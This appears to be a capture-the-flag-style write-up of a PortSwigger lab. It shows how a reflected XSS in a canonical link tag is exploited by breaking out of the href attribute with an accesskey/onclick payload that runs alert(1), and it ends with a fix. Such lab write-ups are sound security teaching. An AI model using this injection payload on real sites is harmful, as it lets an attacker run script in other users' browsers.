# PoC: Reflected XSS in Canonical Link Tag

**Lab:** PortSwigger — Reflected XSS in canonical link tag
**Status:** Solved ✅

## Vulnerability

The query string is reflected unencoded inside a `<link rel="canonical" href='...'/>` tag in the `<head>`. A single quote breaks out of the `href` attribute, letting new attributes be injected onto the tag.

## Steps

1. **Confirm reflection** — requested `?hello`, saw it echoed straight into the `href` value:
   ```html
   <link rel="canonical" href='https://YOUR-LAB-ID.web-security-academy.net/?hello'/>
   ```

2. **Test attribute breakout** — requested `?' onload='alert(1)`, confirmed the injected attribute landed on the tag itself:
   ```html
   <link rel="canonical" href='...?' onload='alert(1)'/>
   ```
   `<link>` isn't clickable/focusable though, so `onload`/`onclick` alone won't fire without user interaction.

3. **Use `accesskey` to force a trigger** — `accesskey` binds a keyboard shortcut to an element, which fires its `onclick` when pressed:
   ```
   ?'accesskey='x'onclick='alert(1)
   ```
   No closing `'` is added — the template already prints one right after the input, so it naturally closes the `onclick` attribute.

   Final HTML:
   ```html
   <link rel="canonical" href='...?' accesskey='x' onclick='alert(1)'/>
   ```

4. **Trigger it** — load the URL, then press the accesskey shortcut for `x` (`Alt+X` on Chrome, `Alt+Shift+X` on Firefox). `alert(1)` fires → lab solved.

## Payload

```
https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```

## Fix

Encode `'`, `"`, `<`, `>` when reflecting user input into HTML attributes, and avoid echoing the raw request URL into markup at all.
